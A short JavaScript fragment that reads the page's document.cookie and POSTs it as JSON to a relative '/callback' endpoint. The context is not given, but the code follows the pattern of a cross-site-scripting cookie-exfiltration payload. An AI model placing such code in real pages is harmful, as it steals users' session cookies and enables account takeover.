 fetch('/callback', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ cookies: document.cookie })
 });
